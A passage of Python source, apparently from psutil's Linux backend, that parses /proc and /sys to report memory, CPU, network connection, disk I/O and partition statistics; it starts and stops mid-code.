None:\n    __extra__all__.extend(\n        [x for x in dir(cext) if x.startswith(\'RLIM\') and x.isupper()])\n\n\n# =====================================================================\n# --- system memory\n# =====================================================================\n\n\ndef calculate_avail_vmem(mems):\n    """Fallback for kernels < 3.14 where /proc/meminfo does not provide\n    "MemAvailable:" column, see:\n    https://blog.famzah.net/2014/09/24/\n    This code reimplements the algorithm outlined here:\n    https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/\n        commit/?id=34e431b0ae398fc54ea69ff85ec700722c9da773\n\n    XXX: on recent kernels this calculation differs by ~1.5% than\n    "MemAvailable:" as it\'s calculated slightly differently, see:\n    https://gitlab.com/procps-ng/procps/issues/42\n    https://github.com/famzah/linux-memavailable-procfs/issues/2\n    It is still way more realistic than doing (free + cached) though.\n    """\n    # Fallback for very old distros. According to\n    # https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/\n    #     commit/?id=34e431b0ae398fc54ea69ff85ec700722c9da773\n    # ...long ago "avail" was calculated as (free + cached).\n    # We might fallback in such cases:\n    # "Active(file)" not available: 2.6.28 / Dec 2008\n    # "Inactive(file)" not available: 2.6.28 / Dec 2008\n    # "SReclaimable:" not available: 2.6.19 / Nov 2006\n    # /proc/zoneinfo not available: 2.6.13 / Aug 2005\n    free = mems[b\'MemFree:\']\n    fallback = free + mems.get(b"Cached:", 0)\n    try:\n        lru_active_file = mems[b\'Active(file):\']\n        lru_inactive_file = mems[b\'Inactive(file):\']\n        slab_reclaimable = mems[b\'SReclaimable:\']\n    except KeyError:\n        return fallback\n    try:\n        f = open_binary(\'%s/zoneinfo\' % get_procfs_path())\n    except IOError:\n        return fallback  # kernel 2.6.13\n\n    watermark_low = 0\n    with f:\n        for line in f:\n            line = line.strip()\n            if line.startswith(b\'low\'):\n                watermark_low += int(line.split()[1])\n    watermark_low *= PAGESIZE\n\n    avail = free - watermark_low\n    pagecache = lru_active_file + lru_inactive_file\n    pagecache -= min(pagecache / 2, watermark_low)\n    avail += pagecache\n    avail += slab_reclaimable - min(slab_reclaimable / 2.0, watermark_low)\n    return int(avail)\n\n\ndef virtual_memory():\n    """Report virtual memory stats.\n    This implementation matches "free" and "vmstat -s" cmdline\n    utility values and procps-ng-3.3.12 source was used as a reference\n    (2016-09-18):\n    https://gitlab.com/procps-ng/procps/blob/\n        24fd2605c51fccc375ab0287cec33aa767f06718/proc/sysinfo.c\n    For reference, procps-ng-3.3.10 is the version available on Ubuntu\n    16.04.\n\n    Note about "available" memory: up until psutil 4.3 it was\n    calculated as "avail = (free + buffers + cached)". Now\n    "MemAvailable:" column (kernel 3.14) from /proc/meminfo is used as\n    it\'s more accurate.\n    That matches "available" column in newer versions of "free".\n    """\n    missing_fields = []\n    mems = {}\n    with open_binary(\'%s/meminfo\' % get_procfs_path()) as f:\n        for line in f:\n            fields = line.split()\n            mems[fields[0]] = int(fields[1]) * 1024\n\n    # /proc doc states that the available fields in /proc/meminfo vary\n    # by architecture and compile options, but these 3 values are also\n    # returned by sysinfo(2); as such we assume they are always there.\n    total = mems[b\'MemTotal:\']\n    free = mems[b\'MemFree:\']\n    try:\n        buffers = mems[b\'Buffers:\']\n    except KeyError:\n        # https://github.com/giampaolo/psutil/issues/1010\n        buffers = 0\n        missing_fields.append(\'buffers\')\n    try:\n        cached = mems[b"Cached:"]\n    except KeyError:\n        cached = 0\n        missing_fields.append(\'cached\')\n    else:\n        # "free" cmdline utility sums reclaimable to cached.\n        # Older versions of procps used to add slab memory instead.\n        # This got changed in:\n        # https://gitlab.com/procps-ng/procps/commit/\n        #     05d751c4f076a2f0118b914c5e51cfbb4762ad8e\n        cached += mems.get(b"SReclaimable:", 0)  # since kernel 2.6.19\n\n    try:\n        shared = mems[b\'Shmem:\']  # since kernel 2.6.32\n    except KeyError:\n        try:\n            shared = mems[b\'MemShared:\']  # kernels 2.4\n        except KeyError:\n            shared = 0\n            missing_fields.append(\'shared\')\n\n    try:\n        active = mems[b"Active:"]\n    except KeyError:\n        active = 0\n        missing_fields.append(\'active\')\n\n    try:\n        inactive = mems[b"Inactive:"]\n    except KeyError:\n        try:\n            inactive = \\\n                mems[b"Inact_dirty:"] + \\\n                mems[b"Inact_clean:"] + \\\n                mems[b"Inact_laundry:"]\n        except KeyError:\n            inactive = 0\n            missing_fields.append(\'inactive\')\n\n    try:\n        slab = mems[b"Slab:"]\n    except KeyError:\n        slab = 0\n\n    used = total - free - cached - buffers\n    if used < 0:\n        # May be symptomatic of running within a LCX container where such\n        # values will be dramatically distorted over those of the host.\n        used = total - free\n\n    # - starting from 4.4.0 we match free\'s "available" column.\n    #   Before 4.4.0 we calculated it as (free + buffers + cached)\n    #   which matched htop.\n    # - free and htop available memory differs as per:\n    #   http://askubuntu.com/a/369589\n    #   http://unix.stackexchange.com/a/65852/168884\n    # - MemAvailable has been introduced in kernel 3.14\n    try:\n        avail = mems[b\'MemAvailable:\']\n    except KeyError:\n        avail = calculate_avail_vmem(mems)\n\n    if avail < 0:\n        avail = 0\n        missing_fields.append(\'available\')\n\n    # If avail is greater than total or our calculation overflows,\n    # that\'s symptomatic of running within a LCX container where such\n    # values will be dramatically distorted over those of the host.\n    # https://gitlab.com/procps-ng/procps/blob/\n    #     24fd2605c51fccc375ab0287cec33aa767f06718/proc/sysinfo.c#L764\n    if avail > total:\n        avail = free\n\n    percent = usage_percent((total - avail), total, round_=1)\n\n    # Warn about missing metrics which are set to 0.\n    if missing_fields:\n        msg = "%s memory stats couldn\'t be determined and %s set to 0" % (\n            ", ".join(missing_fields),\n            "was" if len(missing_fields) == 1 else "were")\n        warnings.warn(msg, RuntimeWarning)\n\n    return svmem(total, avail, percent, used, free,\n                 active, inactive, buffers, cached, shared, slab)\n\n\ndef swap_memory():\n    """Return swap memory metrics."""\n    mems = {}\n    with open_binary(\'%s/meminfo\' % get_procfs_path()) as f:\n        for line in f:\n            fields = line.split()\n            mems[fields[0]] = int(fields[1]) * 1024\n    # We prefer /proc/meminfo over sysinfo() syscall so that\n    # psutil.PROCFS_PATH can be used in order to allow retrieval\n    # for linux containers, see:\n    # https://github.com/giampaolo/psutil/issues/1015\n    try:\n        total = mems[b\'SwapTotal:\']\n        free = mems[b\'SwapFree:\']\n    except KeyError:\n        _, _, _, _, total, free, unit_multiplier = cext.linux_sysinfo()\n        total *= unit_multiplier\n        free *= unit_multiplier\n\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    # get pgin/pgouts\n    try:\n        f = open_binary("%s/vmstat" % get_procfs_path())\n    except IOError as err:\n        # see https://github.com/giampaolo/psutil/issues/722\n        msg = "\'sin\' and \'sout\' swap memory stats couldn\'t " \\\n              "be determined and were set to 0 (%s)" % str(err)\n        warnings.warn(msg, RuntimeWarning)\n        sin = sout = 0\n    else:\n        with f:\n            sin = sout = None\n            for line in f:\n                # values are expressed in 4 kilo bytes, we want\n                # bytes instead\n                if line.startswith(b\'pswpin\'):\n                    sin = int(line.split(b\' \')[1]) * 4 * 1024\n                elif line.startswith(b\'pswpout\'):\n                    sout = int(line.split(b\' \')[1]) * 4 * 1024\n                if sin is not None and sout is not None:\n                    break\n            else:\n                # we might get here when dealing with exotic Linux\n                # flavors, see:\n                # https://github.com/giampaolo/psutil/issues/313\n                msg = "\'sin\' and \'sout\' swap memory stats couldn\'t " \\\n                      "be determined and were set to 0"\n                warnings.warn(msg, RuntimeWarning)\n                sin = sout = 0\n    return _common.sswap(total, used, free, percent, sin, sout)\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    """Return a named tuple representing the following system-wide\n    CPU times:\n    (user, nice, system, idle, iowait, irq, softirq [steal, [guest,\n     [guest_nice]]])\n    Last 3 fields may not be available on all Linux kernel versions.\n    """\n    procfs_path = get_procfs_path()\n    set_scputimes_ntuple(procfs_path)\n    with open_binary(\'%s/stat\' % procfs_path) as f:\n        values = f.readline().split()\n    fields = values[1:len(scputimes._fields) + 1]\n    fields = [float(x) / CLOCK_TICKS for x in fields]\n    return scputimes(*fields)\n\n\ndef per_cpu_times():\n    """Return a list of namedtuple representing the CPU times\n    for every CPU available on the system.\n    """\n    procfs_path = get_procfs_path()\n    set_scputimes_ntuple(procfs_path)\n    cpus = []\n    with open_binary(\'%s/stat\' % procfs_path) as f:\n        # get rid of the first line which refers to system wide CPU stats\n        f.readline()\n        for line in f:\n            if line.startswith(b\'cpu\'):\n                values = line.split()\n                fields = values[1:len(scputimes._fields) + 1]\n                fields = [float(x) / CLOCK_TICKS for x in fields]\n                entry = scputimes(*fields)\n                cpus.append(entry)\n        return cpus\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    try:\n        return os.sysconf("SC_NPROCESSORS_ONLN")\n    except ValueError:\n        # as a second fallback we try to parse /proc/cpuinfo\n        num = 0\n        with open_binary(\'%s/cpuinfo\' % get_procfs_path()) as f:\n            for line in f:\n                if line.lower().startswith(b\'processor\'):\n                    num += 1\n\n        # unknown format (e.g. amrel/sparc architectures), see:\n        # https://github.com/giampaolo/psutil/issues/200\n        # try to parse /proc/stat as a last resort\n        if num == 0:\n            search = re.compile(r\'cpu\\d\')\n            with open_text(\'%s/stat\' % get_procfs_path()) as f:\n                for line in f:\n                    line = line.split(\' \')[0]\n                    if search.match(line):\n                        num += 1\n\n        if num == 0:\n            # mimic os.cpu_count()\n            return None\n        return num\n\n\ndef cpu_count_cores():\n    """Return the number of CPU cores in the system."""\n    # Method #1\n    ls = set()\n    # These 2 files are the same but */core_cpus_list is newer while\n    # */thread_siblings_list is deprecated and may disappear in the future.\n    # https://www.kernel.org/doc/Documentation/admin-guide/cputopology.rst\n    # https://github.com/giampaolo/psutil/pull/1727#issuecomment-707624964\n    # https://lkml.org/lkml/2019/2/26/41\n    p1 = "/sys/devices/system/cpu/cpu[0-9]*/topology/core_cpus_list"\n    p2 = "/sys/devices/system/cpu/cpu[0-9]*/topology/thread_siblings_list"\n    for path in glob.glob(p1) or glob.glob(p2):\n        with open_binary(path) as f:\n            ls.add(f.read().strip())\n    result = len(ls)\n    if result != 0:\n        return result\n\n    # Method #2\n    mapping = {}\n    current_info = {}\n    with open_binary(\'%s/cpuinfo\' % get_procfs_path()) as f:\n        for line in f:\n            line = line.strip().lower()\n            if not line:\n                # new section\n                try:\n                    mapping[current_info[b\'physical id\']] = \\\n                        current_info[b\'cpu cores\']\n                except KeyError:\n                    pass\n                current_info = {}\n            else:\n                # ongoing section\n                if line.startswith((b\'physical id\', b\'cpu cores\')):\n                    key, value = line.split(b\'\\t:\', 1)\n                    current_info[key] = int(value)\n\n    result = sum(mapping.values())\n    return result or None  # mimic os.cpu_count()\n\n\ndef cpu_stats():\n    """Return various CPU stats as a named tuple."""\n    with open_binary(\'%s/stat\' % get_procfs_path()) as f:\n        ctx_switches = None\n        interrupts = None\n        soft_interrupts = None\n        for line in f:\n            if line.startswith(b\'ctxt\'):\n                ctx_switches = int(line.split()[1])\n            elif line.startswith(b\'intr\'):\n                interrupts = int(line.split()[1])\n            elif line.startswith(b\'softirq\'):\n                soft_interrupts = int(line.split()[1])\n            if ctx_switches is not None and soft_interrupts is not None \\\n                    and interrupts is not None:\n                break\n    syscalls = 0\n    return _common.scpustats(\n        ctx_switches, interrupts, soft_interrupts, syscalls)\n\n\ndef _cpu_get_cpuinfo_freq():\n    """Return current CPU frequency from cpuinfo if available.\n    """\n    ret = []\n    with open_binary(\'%s/cpuinfo\' % get_procfs_path()) as f:\n        for line in f:\n            if line.lower().startswith(b\'cpu mhz\'):\n                ret.append(float(line.split(b\':\', 1)[1]))\n    return ret\n\n\nif os.path.exists("/sys/devices/system/cpu/cpufreq/policy0") or \\\n        os.path.exists("/sys/devices/system/cpu/cpu0/cpufreq"):\n    def cpu_freq():\n        """Return frequency metrics for all CPUs.\n        Contrarily to other OSes, Linux updates these values in\n        real-time.\n        """\n        cpuinfo_freqs = _cpu_get_cpuinfo_freq()\n        paths = \\\n            glob.glob("/sys/devices/system/cpu/cpufreq/policy[0-9]*") or \\\n            glob.glob("/sys/devices/system/cpu/cpu[0-9]*/cpufreq")\n        paths.sort(key=lambda x: int(re.search(r"[0-9]+", x).group()))\n        ret = []\n        pjoin = os.path.join\n        for i, path in enumerate(paths):\n            if len(paths) == len(cpuinfo_freqs):\n                # take cached value from cpuinfo if available, see:\n                # https://github.com/giampaolo/psutil/issues/1851\n                curr = cpuinfo_freqs[i] * 1000\n            else:\n                curr = bcat(pjoin(path, "scaling_cur_freq"), fallback=None)\n            if curr is None:\n                # Likely an old RedHat, see:\n                # https://github.com/giampaolo/psutil/issues/1071\n                curr = bcat(pjoin(path, "cpuinfo_cur_freq"), fallback=None)\n                if curr is None:\n                    raise NotImplementedError(\n                        "can\'t find current frequency file")\n            curr = int(curr) / 1000\n            max_ = int(bcat(pjoin(path, "scaling_max_freq"))) / 1000\n            min_ = int(bcat(pjoin(path, "scaling_min_freq"))) / 1000\n            ret.append(_common.scpufreq(curr, min_, max_))\n        return ret\n\nelse:\n    def cpu_freq():\n        """Alternate implementation using /proc/cpuinfo.\n        min and max frequencies are not available and are set to None.\n        """\n        return [_common.scpufreq(x, 0., 0.) for x in _cpu_get_cpuinfo_freq()]\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\nnet_if_addrs = cext_posix.net_if_addrs\n\n\nclass _Ipv6UnsupportedError(Exception):\n    pass\n\n\nclass Connections:\n    """A wrapper on top of /proc/net/* files, retrieving per-process\n    and system-wide open connections (TCP, UDP, UNIX) similarly to\n    "netstat -an".\n\n    Note: in case of UNIX sockets we\'re only able to determine the\n    local endpoint/path, not the one it\'s connected to.\n    According to [1] it would be possible but not easily.\n\n    [1] http://serverfault.com/a/417946\n    """\n\n    def __init__(self):\n        # The string represents the basename of the corresponding\n        # /proc/net/{proto_name} file.\n        tcp4 = ("tcp", socket.AF_INET, socket.SOCK_STREAM)\n        tcp6 = ("tcp6", socket.AF_INET6, socket.SOCK_STREAM)\n        udp4 = ("udp", socket.AF_INET, socket.SOCK_DGRAM)\n        udp6 = ("udp6", socket.AF_INET6, socket.SOCK_DGRAM)\n        unix = ("unix", socket.AF_UNIX, None)\n        self.tmap = {\n            "all": (tcp4, tcp6, udp4, udp6, unix),\n            "tcp": (tcp4, tcp6),\n            "tcp4": (tcp4,),\n            "tcp6": (tcp6,),\n            "udp": (udp4, udp6),\n            "udp4": (udp4,),\n            "udp6": (udp6,),\n            "unix": (unix,),\n            "inet": (tcp4, tcp6, udp4, udp6),\n            "inet4": (tcp4, udp4),\n            "inet6": (tcp6, udp6),\n        }\n        self._procfs_path = None\n\n    def get_proc_inodes(self, pid):\n        inodes = defaultdict(list)\n        for fd in os.listdir("%s/%s/fd" % (self._procfs_path, pid)):\n            try:\n                inode = readlink("%s/%s/fd/%s" % (self._procfs_path, pid, fd))\n            except (FileNotFoundError, ProcessLookupError):\n                # ENOENT == file which is gone in the meantime;\n                # os.stat(\'/proc/%s\' % self.pid) will be done later\n                # to force NSP (if it\'s the case)\n                continue\n            except OSError as err:\n                if err.errno == errno.EINVAL:\n                    # not a link\n                    continue\n                if err.errno == errno.ENAMETOOLONG:\n                    # file name too long\n                    debug(err)\n                    continue\n                raise\n            else:\n                if inode.startswith(\'socket:[\'):\n                    # the process is using a socket\n                    inode = inode[8:][:-1]\n                    inodes[inode].append((pid, int(fd)))\n        return inodes\n\n    def get_all_inodes(self):\n        inodes = {}\n        for pid in pids():\n            try:\n                inodes.update(self.get_proc_inodes(pid))\n            except (FileNotFoundError, ProcessLookupError, PermissionError):\n                # os.listdir() is gonna raise a lot of access denied\n                # exceptions in case of unprivileged user; that\'s fine\n                # as we\'ll just end up returning a connection with PID\n                # and fd set to None anyway.\n                # Both netstat -an and lsof does the same so it\'s\n                # unlikely we can do any better.\n                # ENOENT just means a PID disappeared on us.\n                continue\n        return inodes\n\n    @staticmethod\n    def decode_address(addr, family):\n        """Accept an "ip:port" address as displayed in /proc/net/*\n        and convert it into a human readable form, like:\n\n        "0500000A:0016" -> ("10.0.0.5", 22)\n        "0000000000000000FFFF00000100007F:9E49" -> ("::ffff:127.0.0.1", 40521)\n\n        The IP address portion is a little or big endian four-byte\n        hexadecimal number; that is, the least significant byte is listed\n        first, so we need to reverse the order of the bytes to convert it\n        to an IP address.\n        The port is represented as a two-byte hexadecimal number.\n\n        Reference:\n        http://linuxdevcenter.com/pub/a/linux/2000/11/16/LinuxAdmin.html\n        """\n        ip, port = addr.split(\':\')\n        port = int(port, 16)\n        # this usually refers to a local socket in listen mode with\n        # no end-points connected\n        if not port:\n            return ()\n        if PY3:\n            ip = ip.encode(\'ascii\')\n        if family == socket.AF_INET:\n            # see: https://github.com/giampaolo/psutil/issues/201\n            if LITTLE_ENDIAN:\n                ip = socket.inet_ntop(family, base64.b16decode(ip)[::-1])\n            else:\n                ip = socket.inet_ntop(family, base64.b16decode(ip))\n        else:  # IPv6\n            ip = base64.b16decode(ip)\n            try:\n                # see: https://github.com/giampaolo/psutil/issues/201\n                if LITTLE_ENDIAN:\n                    ip = socket.inet_ntop(\n                        socket.AF_INET6,\n                        struct.pack(\'>4I\', *struct.unpack(\'<4I\', ip)))\n                else:\n                    ip = socket.inet_ntop(\n                        socket.AF_INET6,\n                        struct.pack(\'<4I\', *struct.unpack(\'<4I\', ip)))\n            except ValueError:\n                # see: https://github.com/giampaolo/psutil/issues/623\n                if not supports_ipv6():\n                    raise _Ipv6UnsupportedError\n                else:\n                    raise\n        return _common.addr(ip, port)\n\n    @staticmethod\n    def process_inet(file, family, type_, inodes, filter_pid=None):\n        """Parse /proc/net/tcp* and /proc/net/udp* files."""\n        if file.endswith(\'6\') and not os.path.exists(file):\n            # IPv6 not supported\n            return\n        with open_text(file) as f:\n            f.readline()  # skip the first line\n            for lineno, line in enumerate(f, 1):\n                try:\n                    _, laddr, raddr, status, _, _, _, _, _, inode = \\\n                        line.split()[:10]\n                except ValueError:\n                    raise RuntimeError(\n                        "error while parsing %s; malformed line %s %r" % (\n                            file, lineno, line))\n                if inode in inodes:\n                    # # We assume inet sockets are unique, so we error\n                    # # out if there are multiple references to the\n                    # # same inode. We won\'t do this for UNIX sockets.\n                    # if len(inodes[inode]) > 1 and family != socket.AF_UNIX:\n                    #     raise ValueError("ambiguos inode with multiple "\n                    #                      "PIDs references")\n                    pid, fd = inodes[inode][0]\n                else:\n                    pid, fd = None, -1\n                if filter_pid is not None and filter_pid != pid:\n                    continue\n                else:\n                    if type_ == socket.SOCK_STREAM:\n                        status = TCP_STATUSES[status]\n                    else:\n                        status = _common.CONN_NONE\n                    try:\n                        laddr = Connections.decode_address(laddr, family)\n                        raddr = Connections.decode_address(raddr, family)\n                    except _Ipv6UnsupportedError:\n                        continue\n                    yield (fd, family, type_, laddr, raddr, status, pid)\n\n    @staticmethod\n    def process_unix(file, family, inodes, filter_pid=None):\n        """Parse /proc/net/unix files."""\n        with open_text(file) as f:\n            f.readline()  # skip the first line\n            for line in f:\n                tokens = line.split()\n                try:\n                    _, _, _, _, type_, _, inode = tokens[0:7]\n                except ValueError:\n                    if \' \' not in line:\n                        # see: https://github.com/giampaolo/psutil/issues/766\n                        continue\n                    raise RuntimeError(\n                        "error while parsing %s; malformed line %r" % (\n                            file, line))\n                if inode in inodes:\n                    # With UNIX sockets we can have a single inode\n                    # referencing many file descriptors.\n                    pairs = inodes[inode]\n                else:\n                    pairs = [(None, -1)]\n                for pid, fd in pairs:\n                    if filter_pid is not None and filter_pid != pid:\n                        continue\n                    else:\n                        if len(tokens) == 8:\n                            path = tokens[-1]\n                        else:\n                            path = ""\n                        type_ = _common.socktype_to_enum(int(type_))\n                        # XXX: determining the remote endpoint of a\n                        # UNIX socket on Linux is not possible, see:\n                        # https://serverfault.com/questions/252723/\n                        raddr = ""\n                        status = _common.CONN_NONE\n                        yield (fd, family, type_, path, raddr, status, pid)\n\n    def retrieve(self, kind, pid=None):\n        if kind not in self.tmap:\n            raise ValueError("invalid %r kind argument; choose between %s"\n                             % (kind, \', \'.join([repr(x) for x in self.tmap])))\n        self._procfs_path = get_procfs_path()\n        if pid is not None:\n            inodes = self.get_proc_inodes(pid)\n            if not inodes:\n                # no connections for this process\n                return []\n        else:\n            inodes = self.get_all_inodes()\n        ret = set()\n        for proto_name, family, type_ in self.tmap[kind]:\n            path = "%s/net/%s" % (self._procfs_path, proto_name)\n            if family in (socket.AF_INET, socket.AF_INET6):\n                ls = self.process_inet(\n                    path, family, type_, inodes, filter_pid=pid)\n            else:\n                ls = self.process_unix(\n                    path, family, inodes, filter_pid=pid)\n            for fd, family, type_, laddr, raddr, status, bound_pid in ls:\n                if pid:\n                    conn = _common.pconn(fd, family, type_, laddr, raddr,\n                                         status)\n                else:\n                    conn = _common.sconn(fd, family, type_, laddr, raddr,\n                                         status, bound_pid)\n                ret.add(conn)\n        return list(ret)\n\n\n_connections = Connections()\n\n\ndef net_connections(kind=\'inet\'):\n    """Return system-wide open connections."""\n    return _connections.retrieve(kind)\n\n\ndef net_io_counters():\n    """Return network I/O statistics for every network interface\n    installed on the system as a dict of raw tuples.\n    """\n    with open_text("%s/net/dev" % get_procfs_path()) as f:\n        lines = f.readlines()\n    retdict = {}\n    for line in lines[2:]:\n        colon = line.rfind(\':\')\n        assert colon > 0, repr(line)\n        name = line[:colon].strip()\n        fields = line[colon + 1:].strip().split()\n\n        # in\n        (bytes_recv,\n         packets_recv,\n         errin,\n         dropin,\n         fifoin,  # unused\n         framein,  # unused\n         compressedin,  # unused\n         multicastin,  # unused\n         # out\n         bytes_sent,\n         packets_sent,\n         errout,\n         dropout,\n         fifoout,  # unused\n         collisionsout,  # unused\n         carrierout,  # unused\n         compressedout) = map(int, fields)\n\n        retdict[name] = (bytes_sent, bytes_recv, packets_sent, packets_recv,\n                         errin, errout, dropin, dropout)\n    return retdict\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    duplex_map = {cext.DUPLEX_FULL: NIC_DUPLEX_FULL,\n                  cext.DUPLEX_HALF: NIC_DUPLEX_HALF,\n                  cext.DUPLEX_UNKNOWN: NIC_DUPLEX_UNKNOWN}\n    names = net_io_counters().keys()\n    ret = {}\n    for name in names:\n        try:\n            mtu = cext_posix.net_if_mtu(name)\n            isup = cext_posix.net_if_is_running(name)\n            duplex, speed = cext.net_if_duplex_speed(name)\n        except OSError as err:\n            # https://github.com/giampaolo/psutil/issues/1279\n            if err.errno != errno.ENODEV:\n                raise\n            else:\n                debug(err)\n        else:\n            ret[name] = _common.snicstats(isup, duplex_map[duplex], speed, mtu)\n    return ret\n\n\n# =====================================================================\n# --- disks\n# =====================================================================\n\n\ndisk_usage = _psposix.disk_usage\n\n\ndef disk_io_counters(perdisk=False):\n    """Return disk I/O statistics for every disk installed on the\n    system as a dict of raw tuples.\n    """\n    def read_procfs():\n        # OK, this is a bit confusing. The format of /proc/diskstats can\n        # have 3 variations.\n        # On Linux 2.4 each line has always 15 fields, e.g.:\n        # "3     0   8 hda 8 8 8 8 8 8 8 8 8 8 8"\n        # On Linux 2.6+ each line *usually* has 14 fields, and the disk\n        # name is in another position, like this:\n        # "3    0   hda 8 8 8 8 8 8 8 8 8 8 8"\n        # ...unless (Linux 2.6) the line refers to a partition instead\n        # of a disk, in which case the line has less fields (7):\n        # "3    1   hda1 8 8 8 8"\n        # 4.18+ has 4 fields added:\n        # "3    0   hda 8 8 8 8 8 8 8 8 8 8 8 0 0 0 0"\n        # 5.5 has 2 more fields.\n        # See:\n        # https://www.kernel.org/doc/Documentation/iostats.txt\n        # https://www.kernel.org/doc/Documentation/ABI/testing/procfs-diskstats\n        with open_text("%s/diskstats" % get_procfs_path()) as f:\n            lines = f.readlines()\n        for line in lines:\n            fields = line.split()\n            flen = len(fields)\n            if flen == 15:\n                # Linux 2.4\n                name = fields[3]\n                reads = int(fields[2])\n                (reads_merged, rbytes, rtime, writes, writes_merged,\n                    wbytes, wtime, _, busy_time, _) = map(int, fields[4:14])\n            elif flen == 14 or flen >= 18:\n                # Linux 2.6+, line referring to a disk\n                name = fields[2]\n                (reads, reads_merged, rbytes, rtime, writes, writes_merged,\n                    wbytes, wtime, _, busy_time, _) = map(int, fields[3:14])\n            elif flen == 7:\n                # Linux 2.6+, line referring to a partition\n                name = fields[2]\n                reads, rbytes, writes, wbytes = map(int, fields[3:])\n                rtime = wtime = reads_merged = writes_merged = busy_time = 0\n            else:\n                raise ValueError("not sure how to interpret line %r" % line)\n            yield (name, reads, writes, rbytes, wbytes, rtime, wtime,\n                   reads_merged, writes_merged, busy_time)\n\n    def read_sysfs():\n        for block in os.listdir(\'/sys/block\'):\n            for root, _, files in os.walk(os.path.join(\'/sys/block\', block)):\n                if \'stat\' not in files:\n                    continue\n                with open_text(os.path.join(root, \'stat\')) as f:\n                    fields = f.read().strip().split()\n                name = os.path.basename(root)\n                (reads, reads_merged, rbytes, rtime, writes, writes_merged,\n                    wbytes, wtime, _, busy_time) = map(int, fields[:10])\n                yield (name, reads, writes, rbytes, wbytes, rtime,\n                       wtime, reads_merged, writes_merged, busy_time)\n\n    if os.path.exists(\'%s/diskstats\' % get_procfs_path()):\n        gen = read_procfs()\n    elif os.path.exists(\'/sys/block\'):\n        gen = read_sysfs()\n    else:\n        raise NotImplementedError(\n            "%s/diskstats nor /sys/block filesystem are available on this "\n            "system" % get_procfs_path())\n\n    retdict = {}\n    for entry in gen:\n        (name, reads, writes, rbytes, wbytes, rtime, wtime, reads_merged,\n            writes_merged, busy_time) = entry\n        if not perdisk and not is_storage_device(name):\n            # perdisk=False means we want to calculate totals so we skip\n            # partitions (e.g. \'sda1\', \'nvme0n1p1\') and only include\n            # base disk devices (e.g. \'sda\', \'nvme0n1\'). Base disks\n            # include a total of all their partitions + some extra size\n            # of their own:\n            #     $ cat /proc/diskstats\n            #     259       0 sda 10485760 ...\n            #     259       1 sda1 5186039 ...\n            #     259       1 sda2 5082039 ...\n            # See:\n            # https://github.com/giampaolo/psutil/pull/1313\n            continue\n\n        rbytes *= DISK_SECTOR_SIZE\n        wbytes *= DISK_SECTOR_SIZE\n        retdict[name] = (reads, writes, rbytes, wbytes, rtime, wtime,\n                         reads_merged, writes_merged, busy_time)\n\n    return retdict\n\n\nclass RootFsDeviceFinder:\n    """disk_partitions() may return partitions with device == "/dev/root"\n    or "rootfs". This container class uses different strategies to try to\n    obtain the real device path. Resources:\n    https://bootlin.com/blog/find-root-device/\n    https://www.systutorials.com/how-to-find-the-disk-where-root-is-on-in-bash-on-linux/\n    """\n    __slots__ = [\'major\', \'minor\']\n\n    def __init__(self):\n        dev = os.stat("/").st_dev\n        self.major = os.major(dev)\n        self.minor = os.minor(dev)\n\n    def ask_proc_partitions(self):\n        with open_text("%s/partitions" % get_procfs_path()) as f:\n            for line in f.readlines()[2:]:\n                fields = line.split()\n                if len(fields) < 4:  # just for extra safety\n                    continue\n                major = int(fields[0]) if fields[0].isdigit() else None\n                minor = int(fields[1]) if fields[1].isdigit() else None\n                name = fields[3]\n                if major == self.major and minor == self.minor:\n                    if name:  # just for extra safety\n                        return "/dev/%s" % name\n\n    def ask_sys_dev_block(self):\n        path = "/sys/dev/block/%s:%s/uevent" % (self.major, self.minor)\n        with open_text(path) as f:\n            for line in f:\n                if line.startswith("DEVNAME="):\n                    name = line.strip().rpartition("DEVNAME=")[2]\n                    if name:  # just for extra safety\n                        return "/dev/%s" % name\n\n    def ask_sys_class_block(self):\n        needle = "%s:%s" % (self.major, self.minor)\n        files = glob.iglob("/sys/class/block/*/dev")\n        for file in files:\n            try:\n                f = open_text(file)\n            except FileNotFoundError:  # race condition\n                continue\n            else:\n                with f:\n                    data = f.read().strip()\n                    if data == needle:\n                        name = os.path.basename(os.path.dirname(file))\n                        return "/dev/%s" % name\n\n    def find(self):\n        path = None\n        if path is None:\n            try:\n                path = self.ask_proc_partitions()\n            except (IOError, OSError) as err:\n                debug(err)\n        if path is None:\n            try:\n                path = self.ask_sys_dev_block()\n            except (IOError, OSError) as err:\n                debug(err)\n        if path is None:\n            try:\n                path = self.ask_sys_class_block()\n            except (IOError, OSError) as err:\n                debug(err)\n        # We use exists() because the "/dev/*" part of the path is hard\n        # coded, so we want to be sure.\n        if path is not None and os.path.exists(path):\n            return path\n\n\ndef disk_partitions(all=False):\n    """Return mounted disk partitions as a list of namedtuples."""\n    fstypes = set()\n    procfs_path = get_procfs_path()\n    with open_text("%s/filesystems" % procfs_path) as f:\n        for line in f:\n            line = line.strip()\n            if not line.startswith("nodev"):\n                fstypes.add(line.strip())\n            else:\n                # ignore all lines starting with "nodev" except "nodev zfs"\n                fstype = line.split("\\t")[1]\n                if fstype == "zfs":\n                    fstypes.add("zfs")\n\n    # See: https://github.com/giampaolo/psutil/issues/1307\n    if procfs_path == "/proc" and os.path.isfile(\'/etc/mtab\'):\n        mounts_path = os.path.realpath("/etc/mtab")\n    else:\n        mounts_path = os.path.realpath("%s/self/mounts" % procfs_path)\n\n    retlist = []\n    partitions = cext.disk_partitions(mounts_path)\n    for partition in partitions:\n        device, mountpoint, fstype, opts = partition\n        if device == \'none\':\n            device = \'\'\n        if device in ("/dev/root", "rootfs"):\n            device = RootFsDeviceFinder().find() or device\n        if not all:\n            if device == \'\' or fstype not in fstypes:\n                continue\n        maxfile = maxpath = None  # set later\n        ntuple = _common.sdiskpart(device, mountpoint, fstype, opts,\n                                   maxfile, maxpath)\n        retlist.append(ntuple)\n\n    return retlist\n\n\n# =====================================================================\n# --- sensors\n# =====================================================================\n\n\ndef sensors_temperatures():\n    """Return hardware (CPU and others) temperatures as a dict\n    including hardware name, label, current, max and critical\n    temperatures.\n\n    Implementation notes:\n    - /sys/class/hwmon looks like the most recent interface to\n      retrieve this info, and this implementation relies on it\n      only (old distros will probably use something else)\n    - 